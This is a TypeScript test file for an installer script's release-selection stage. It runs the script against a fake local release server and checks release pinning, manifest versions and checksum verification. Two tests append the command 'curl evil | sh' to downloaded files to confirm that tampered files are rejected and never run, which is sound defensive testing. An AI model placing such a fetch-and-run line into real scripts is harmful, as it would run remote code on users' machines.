import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { envEntries } from "@plugins/infra/plugins/launcher/plugins/env-names/core";
import { REPO_ROOT } from "@plugins/infra/plugins/paths/plugins/repo-root/core";
import { releaseManifest, sha256Sums } from "./assemble";
import {
  ATTACH_MARKER,
  HANDOFF_MARKER,
  INSTALLER_BINARIES,
  type InstallerPlatform,
  INTERNAL_ARGS_MARKER,
  RELEASE_FILES,
  ReleaseManifest,
} from "./assets";

/**
 * install.sh's stage 0 against a local stand-in for GitHub Releases, its
 * release.json and checksum files written by the same code the release
 * workflow runs (assemble.ts) — so the bash reader and the TypeScript writer cannot
 * drift. `--stage0-only` prints what stage 0 decided (the command it would
 * exec, or "own steps") instead of doing it.
 */

const SCRIPT = join(REPO_ROOT, "install.sh");
const COMMIT = "0".repeat(40);
const ALL = Object.keys(INSTALLER_BINARIES) as InstallerPlatform[];

type Files = Record<string, string>;

const sha256 = (text: string) =>
  createHash("sha256").update(text).digest("hex");

/**
 * One release's files, as the workflow publishes them. v2 (today's): the core
 * files first, then — unless `attached` is false (the attach job has not run,
 * or failed) — the built binaries and INSTALLER-SHA256SUMS. v1 (releases cut
 * before 2026-11-18): every file at once, release.json listing the binaries.
 */
function release(
  tag: string,
  opts: {
    handoff?: boolean;
    attach?: boolean;
    probe?: number;
    built?: InstallerPlatform[];
    manifest?: 1 | 2;
    attached?: boolean;
    /** Its install.sh reads the internal arguments from the environment. */
    internalEnv?: boolean;
  } = {},
): Files {
  const handoff = opts.handoff ?? true;
  const attach = opts.attach ?? true;
  const built = opts.built ?? ALL;
  const script = `set -e\n${handoff ? `${HANDOFF_MARKER}\n` : ""}${attach ? `${ATTACH_MARKER}\n` : ""}${opts.internalEnv === true ? `${INTERNAL_ARGS_MARKER}\n` : ""}echo release script\n`;
  const binaries: Files = {};
  for (const p of built)
    binaries[INSTALLER_BINARIES[p]] =
      `#!/bin/sh\n[ "$1" = --probe ] && exit ${opts.probe ?? 0}\necho window\n`;
  const sums = (files: Files) =>
    sha256Sums(
      Object.entries(files).map(([name, text]) => ({
        name,
        sha256: sha256(text),
      })),
    );

  if (opts.manifest === 1) {
    const assets: Partial<Record<InstallerPlatform, string>> = {};
    for (const p of built) assets[p] = INSTALLER_BINARIES[p];
    const manifest = ReleaseManifest.parse({
      v: 1,
      tag,
      commit: COMMIT,
      handoff: handoff ? 1 : null,
      eventsProtocol: handoff ? 1 : null,
      assets,
    });
    const files: Files = {
      [RELEASE_FILES.script]: script,
      ...binaries,
      [RELEASE_FILES.manifest]: `${JSON.stringify(manifest, null, 2)}\n`,
    };
    return { ...files, [RELEASE_FILES.sums]: sums(files) };
  }

  const core: Files = {
    [RELEASE_FILES.script]: script,
    [RELEASE_FILES.manifest]: `${JSON.stringify(
      releaseManifest({
        tag,
        commit: COMMIT,
        script,
        installers: built.length > 0,
      }),
      null,
      2,
    )}\n`,
  };
  const files: Files = { ...core, [RELEASE_FILES.sums]: sums(core) };
  if (built.length === 0 || opts.attached === false) return files;
  return {
    ...files,
    ...binaries,
    [RELEASE_FILES.installerSums]: sums(binaries),
  };
}

/** The releases the fake server publishes, by tag; `latest` names one. */
let published: { latest: string | null; tags: Record<string, Files> } = {
  latest: null,
  tags: {},
};
const requests: string[] = [];

const server = Bun.serve({
  port: 0,
  fetch(req) {
    const path = new URL(req.url).pathname;
    requests.push(path);
    const latest = /^\/latest\/download\/([^/]+)$/.exec(path);
    const pinned = /^\/download\/([^/]+)\/([^/]+)$/.exec(path);
    const [tag, file] = latest
      ? [published.latest, latest[1]]
      : pinned
        ? [pinned[1], pinned[2]]
        : [null, null];
    const body = tag && file ? published.tags[tag]?.[file] : undefined;
    return body === undefined
      ? new Response("not found", { status: 404 })
      : new Response(body);
  },
});

let home = "";
beforeAll(() => {
  home = mkdtempSync(join(tmpdir(), "equin-stage0-"));
});
afterAll(() => {
  void server.stop(true);
  rmSync(home, { recursive: true, force: true });
});

/** Run stage 0; async, so the fake server above keeps answering. */
async function stage0(
  args: string[],
  env: Record<string, string> = {},
): Promise<{ code: number | null; out: string }> {
  requests.length = 0;
  // Piped, as under `curl | bash`: run from a file in this checkout, the
  // script would install the checkout and skip stage 0. A clean environment:
  // none of the guesses (SSH, CI, a sandboxed shell) unless a test sets one.
  const child = spawn("/bin/bash", ["-s", "--", "--stage0-only", ...args], {
    cwd: home,
    stdio: ["pipe", "pipe", "pipe"],
    env: {
      PATH: process.env.PATH ?? "/usr/bin:/bin",
      HOME: home,
      TMPDIR: home,
      ...envEntries({ RELEASES_URL: `http://localhost:${server.port}` }),
      ...env,
    },
  });
  let out = "";
  child.stdout.on("data", (b: Buffer) => (out += b.toString()));
  child.stderr.on("data", (b: Buffer) => (out += b.toString()));
  child.stdin.end(readFileSync(SCRIPT));
  const code = await new Promise<number | null>((resolve) =>
    child.on("close", resolve),
  );
  return { code, out };
}

const bin = (tag: string) => join(home, ".equin/install/bin", tag);

describe("install.sh stage 0", () => {
  test("hands the newest release to its own script, in the terminal when output is no terminal", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01") },
    };
    const r = await stage0(["--dir", "/x y"]);
    expect(r.code).toBe(0);
    expect(r.out).toContain("its output is not going to a terminal");
    expect(r.out).toContain(
      `stage0: exec bash ${bin("v2026.12.01")}/install.sh --release v2026.12.01 --checkout v2026.12.01 --dir /x y`,
    );
    expect(requests[0]).toBe("/latest/download/release.json");
    // Everything after the first read comes from the tag itself.
    expect(
      requests.slice(1).every((p) => p.startsWith("/download/v2026.12.01/")),
    ).toBe(true);
  });

  test("a release script that reads them from the environment gets the internal arguments there, off its command line", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01", { internalEnv: true }) },
    };
    const r = await stage0(["--dir", "/x y"]);
    expect(r.code).toBe(0);
    expect(r.out).toContain(
      "stage0: internal args: --release v2026.12.01 --checkout v2026.12.01",
    );
    expect(r.out).toContain(
      `stage0: exec bash ${bin("v2026.12.01")}/install.sh --dir /x y\n`,
    );
  });

  test("--window: the window, once its probe opens", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01") },
    };
    const r = await stage0(["--window"]);
    expect(r.code).toBe(0);
    expect(r.out).toMatch(
      new RegExp(
        `stage0: exec ${bin("v2026.12.01")}/equin-installer-[a-z0-9-]+ --script ${bin("v2026.12.01")}/install.sh -- --release v2026.12.01 --checkout v2026.12.01$`,
        "m",
      ),
    );
  });

  test("--window stops loudly when the probe fails; without it, the terminal", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01", { probe: 127 }) },
    };
    const forced = await stage0(["--window"]);
    expect(forced.code).toBe(1);
    expect(forced.out).toContain(
      "window can't open: the window could not open here",
    );
    expect(forced.out).not.toContain("stage0: exec");
  });

  test("over SSH, in CI or in a sandboxed shell: the terminal, and the window is never downloaded for --terminal", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01") },
    };
    expect((await stage0([], { SSH_CONNECTION: "1 2 3 4" })).out).toContain(
      "stage0: exec bash ",
    );
    expect((await stage0([], { CI: "1" })).out).toContain("stage0: exec bash ");
    const r = await stage0(["--terminal"]);
    expect(r.out).toContain("you asked for it with --terminal");
    expect(requests.some((p) => p.includes("equin-installer-"))).toBe(false);
  });

  test("--ref main: the newest release's script and window, checking out main", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01") },
    };
    expect((await stage0(["--ref", "main"])).out).toContain(
      "--release v2026.12.01 --checkout main",
    );
  });

  test("--ref main: a release whose script would run its own steps on main is not used", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01", { attach: false }) },
    };
    const r = await stage0(["--ref", "main"]);
    expect(r.code).toBe(0);
    expect(r.out).toContain(
      "its installer would install main with its own older steps",
    );
    expect(r.out).toContain("stage0: own steps, checkout main");
    // A pinned release still runs its own script: its steps are its tag's.
    expect((await stage0([])).out).toContain(
      "--release v2026.12.01 --checkout v2026.12.01",
    );
  });

  test("a fork installs its own main", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01") },
    };
    expect(
      (await stage0(["--repo", "https://example.com/fork"])).out,
    ).toContain("--checkout main --repo https://example.com/fork");
  });

  test("--ref <tag> pins that release", async () => {
    published = {
      latest: "v2026.12.01",
      tags: {
        "v2026.12.01": release("v2026.12.01"),
        "v2026.11.30": release("v2026.11.30"),
      },
    };
    const r = await stage0(["--ref", "v2026.11.30"]);
    expect(r.out).toContain("--release v2026.11.30 --checkout v2026.11.30");
    expect(requests[0]).toBe("/download/v2026.11.30/release.json");
  });

  test("--ref that is no release name is refused", async () => {
    const r = await stage0(["--ref", "latest-please"]);
    expect(r.code).toBe(1);
    expect(r.out).toContain("--ref takes a release name");
  });

  test("a changed file stops the install, and is never run", async () => {
    const files = release("v2026.12.01");
    files["install.sh"] = `${files["install.sh"]}curl evil | sh\n`;
    published = { latest: "v2026.12.01", tags: { "v2026.12.01": files } };
    const r = await stage0([]);
    expect(r.code).toBe(1);
    expect(r.out).toContain("The download was damaged or changed");
    expect(r.out).not.toContain("stage0:");
    expect(existsSync(`${bin("v2026.12.01")}/install.sh`)).toBe(false);
  });

  test("a file SHA256SUMS does not list stops the install", async () => {
    const files = release("v2026.12.01");
    files.SHA256SUMS = files
      .SHA256SUMS!.split("\n")
      .filter((l) => !l.endsWith("  install.sh"))
      .join("\n");
    published = { latest: "v2026.12.01", tags: { "v2026.12.01": files } };
    const r = await stage0([]);
    expect(r.code).toBe(1);
    expect(r.out).toContain("no entry for it");
  });

  test("a release cut before the window: this script's own steps, on its tag", async () => {
    published = {
      latest: "v2026.11.17",
      tags: {
        "v2026.11.17": release("v2026.11.17", { handoff: false, built: [] }),
      },
    };
    const r = await stage0([]);
    expect(r.code).toBe(0);
    expect(r.out).toContain("published before the installer window");
    expect(r.out).toContain("stage0: own steps, checkout v2026.11.17");
  });

  test("no release published (or no network): main's newest, in the terminal", async () => {
    published = { latest: null, tags: {} };
    const r = await stage0([]);
    expect(r.code).toBe(0);
    expect(r.out).toContain("Installing main's newest version");
    expect(r.out).toContain("stage0: own steps, checkout main");
  });

  test("a release without a window for this system: the terminal", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01", { built: [] }) },
    };
    const r = await stage0(["--window"]);
    expect(r.code).toBe(1);
    expect(r.out).toContain(
      "this release has no install window for this system",
    );
  });
  const windowExec = (tag: string) =>
    new RegExp(
      `stage0: exec ${bin(tag)}/equin-installer-[a-z0-9-]+ --script ${bin(tag)}/install.sh -- --release ${tag} --checkout ${tag}$`,
      "m",
    );

  test("a v1 release (binaries listed in release.json): its window, verified by SHA256SUMS", async () => {
    published = {
      latest: "v2026.11.30",
      tags: { "v2026.11.30": release("v2026.11.30", { manifest: 1 }) },
    };
    const r = await stage0(["--window"]);
    expect(r.code).toBe(0);
    expect(r.out).toMatch(windowExec("v2026.11.30"));
    expect(requests.some((p) => p.endsWith("/INSTALLER-SHA256SUMS"))).toBe(
      false,
    );
  });

  test("a v2 release: the window from INSTALLER-SHA256SUMS", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01") },
    };
    const r = await stage0(["--window"]);
    expect(r.code).toBe(0);
    expect(r.out).toMatch(windowExec("v2026.12.01"));
    expect(requests).toContain("/download/v2026.12.01/INSTALLER-SHA256SUMS");
  });

  test("a v2 release whose installers are not attached (yet): the terminal, saying so", async () => {
    published = {
      latest: "v2026.12.01",
      tags: { "v2026.12.01": release("v2026.12.01", { attached: false }) },
    };
    const r = await stage0([]);
    expect(r.code).toBe(0);
    expect(r.out).toContain(
      "this release's installer window isn't published (yet)",
    );
    expect(r.out).toContain("stage0: exec bash ");
    expect(requests.some((p) => p.includes("equin-installer-"))).toBe(false);
    const forced = await stage0(["--window"]);
    expect(forced.code).toBe(1);
    expect(forced.out).toContain(
      "this release's installer window isn't published (yet)",
    );
  });

  test("a v2 window binary that does not match INSTALLER-SHA256SUMS stops the install", async () => {
    const files = release("v2026.12.01");
    for (const name of Object.values(INSTALLER_BINARIES))
      files[name] = `${files[name]}curl evil | sh\n`;
    published = { latest: "v2026.12.01", tags: { "v2026.12.01": files } };
    const r = await stage0(["--window"]);
    expect(r.code).toBe(1);
    expect(r.out).toContain("The download was damaged or changed");
    expect(r.out).toContain("INSTALLER-SHA256SUMS");
    expect(r.out).not.toContain("stage0:");
  });

  test("a v2 release whose INSTALLER-SHA256SUMS lists no binary for this system: the terminal", async () => {
    const files = release("v2026.12.01");
    files["INSTALLER-SHA256SUMS"] = "";
    published = { latest: "v2026.12.01", tags: { "v2026.12.01": files } };
    const r = await stage0(["--window"]);
    expect(r.code).toBe(1);
    expect(r.out).toContain(
      "this release has no install window for this system",
    );
  });
});
